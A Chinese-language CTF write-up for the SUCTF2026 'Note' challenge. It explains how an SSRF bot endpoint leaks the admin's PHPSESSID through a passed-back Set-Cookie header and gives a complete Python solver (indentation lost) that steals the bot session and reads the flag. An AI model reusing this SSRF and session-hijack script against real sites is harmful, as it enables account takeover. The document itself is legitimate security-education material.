# SUCTF2026-Note

## 题目简述
题目是 Note 站点的非预期解。题干说明 flag 存在 bot 的 notes 中，flag body 只包含 `0/1`，且不要爆破密码。核心不是笔记功能本身，而是 `/bot/` 可访问内网 `127.0.0.1:80`，并把目标响应中的 `Set-Cookie` 透传出来，导致 bot/admin 的 PHPSESSID 泄露。

## 解题过程
非预期打的

本质是因为/bot/ 可访问内网 127.0.0.1:80 透传了目标响应的 Set-Cookie 导致
bot/admin 的 PHPSESSID 泄露

```python
import argparse
import http.cookiejar
import random
import re
import string
import sys
import urllib.parse
import urllib.request

USER_AGENT = "Mozilla/5.0 (compatible; Codex-SU_Note/1.0)"
FLAG_RE = re.compile(r"SUCTF\{[01]+\}")
CSRF_RE = re.compile(r'name="_csrf"\s+value="([^"]+)"')

def randstr(length: int = 10) -> str:
alphabet = string.ascii_lowercase + string.digits
return "".join(random.choice(alphabet) for _ in range(length))

def build_opener():
jar = http.cookiejar.CookieJar()
opener =
urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
opener.addheaders = [("User-Agent", USER_AGENT)]

return opener, jar

class NoRedirect(urllib.request.HTTPRedirectHandler):
def redirect_request(self, req, fp, code, msg, headers, newurl):
return None

def join_url(base_url: str, path: str) -> str:
return urllib.parse.urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))

def request(opener, url: str, data: bytes | None = None, headers: dict | None
= None):
req = urllib.request.Request(url, data=data, headers=headers or {})
with opener.open(req, timeout=20) as resp:
body = resp.read().decode("utf-8", errors="replace")
return resp, body

def get_cookie_value(jar: http.cookiejar.CookieJar, name: str):
for cookie in jar:
if cookie.name == name:
return cookie.value
return None

def extract_csrf(html: str) -> str:
match = CSRF_RE.search(html)
if not match:
raise RuntimeError("failed to extract CSRF token")
return match.group(1)

def post_form(opener, url: str, fields: dict[str, str]):
data = urllib.parse.urlencode(fields).encode()
headers = {"Content-Type": "application/x-www-form-urlencoded"}
return request(opener, url, data=data, headers=headers)

def register_and_login(base_url: str, username: str, password: str):
opener, jar = build_opener()

register_url = join_url(base_url, "/register.php")
login_url = join_url(base_url, "/login.php")

_, register_html = request(opener, register_url)
register_csrf = extract_csrf(register_html)

post_form(
opener,
register_url,
{
"_csrf": register_csrf,

"username": username,
"password": password,
},
)

_, login_html = request(opener, login_url)
login_csrf = extract_csrf(login_html)

post_form(
opener,
login_url,
{
"_csrf": login_csrf,
"action": "login",
"username": username,
"password": password,
},
)

session_id = get_cookie_value(jar, "PHPSESSID")
if not session_id:
raise RuntimeError("failed to obtain PHPSESSID after login")

return opener, jar, login_csrf

def leak_bot_session(base_url: str, opener, jar, csrf: str, internal_url: str)
-> str:
bot_url = join_url(base_url, "/bot/")
my_session = get_cookie_value(jar, "PHPSESSID")
if not my_session:
raise RuntimeError("missing user PHPSESSID before bot visit")

data = urllib.parse.urlencode(
{
"_csrf": csrf,
"action": "visit",
"url": internal_url,
}
).encode()
headers = {
"Content-Type": "application/x-www-form-urlencoded",
"Cookie": f"PHPSESSID={my_session}",
"User-Agent": USER_AGENT,
}
req = urllib.request.Request(bot_url, data=data, headers=headers)
no_redirect = urllib.request.build_opener(NoRedirect)
try:

resp = no_redirect.open(req, timeout=20)
except urllib.error.HTTPError as exc:
resp = exc

set_cookies = resp.headers.get_all("Set-Cookie") or []
candidates = []
for line in set_cookies:
match = re.search(r"PHPSESSID=([A-Za-z0-9]+)", line)
if match:
value = match.group(1)
if value != my_session:
candidates.append(value)

if not candidates:
raise RuntimeError(f"failed to leak bot session, Set-Cookie headers:
{set_cookies}")

return candidates[0]

def fetch_with_cookie(base_url: str, path: str, session_id: str) -> str:
opener = urllib.request.build_opener()
opener.addheaders = [
("User-Agent", USER_AGENT),
("Cookie", f"PHPSESSID={session_id}"),
]
_, body = request(opener, join_url(base_url, path))
return body

def extract_flag(html: str) -> str | None:
match = FLAG_RE.search(html)
return match.group(0) if match else None

def solve(base_url: str, internal_url: str, username: str | None, password: str
| None):
username = username or f"pwn_{randstr(8)}"
password = password or f"PwN_{randstr(12)}"

print(f"[+] base_url: {base_url}")
print(f"[+] internal_url: {internal_url}")
print(f"[+] username: {username}")
print(f"[+] password: {password}")

opener, jar, csrf = register_and_login(base_url, username, password)
print(f"[+] csrf: {csrf}")
print(f"[+] user session: {get_cookie_value(jar, 'PHPSESSID')}")

leaked_session = leak_bot_session(base_url, opener, jar, csrf,
internal_url)
print(f"[+] leaked bot session: {leaked_session}")

search_html = fetch_with_cookie(base_url, "/search.php?q=SUCTF",
leaked_session)
flag = extract_flag(search_html)
if flag:
print(f"[+] flag via search: {flag}")
return flag

index_html = fetch_with_cookie(base_url, "/", leaked_session)
flag = extract_flag(index_html)
if flag:
print(f"[+] flag via index: {flag}")
return flag

raise RuntimeError("flag not found in leaked session pages")

def main():
parser = argparse.ArgumentParser(description="One-click solver for
SU_Note")
parser.add_argument(
"base_url",
nargs="?",
default="http://<target>:10003/",
help="Challenge base URL",
)
parser.add_argument(
"--internal-url",
default="http://127.0.0.1:80/",
help="Internal URL for bot to visit",
)
parser.add_argument("--username", help="Custom username to register/login")
parser.add_argument("--password", help="Custom password to register/login")
args = parser.parse_args()

try:
flag = solve(args.base_url, args.internal_url, args.username,
args.password)
except Exception as exc:
print(f"[-] {exc}", file=sys.stderr)
return 1

print(f"[+] done: {flag}")
return 0

if __name__ == "__main__":
raise SystemExit(main())
```

## 方法总结
- 核心技巧：Bot SSRF / Cookie 透传
- 识别信号：存在 bot 访问内网页面，并且代理层把响应头带回用户。
- 复用要点：让 bot 请求内网页面，观察 `Set-Cookie` 是否外泄；拿到 admin session 后访问后台内容。
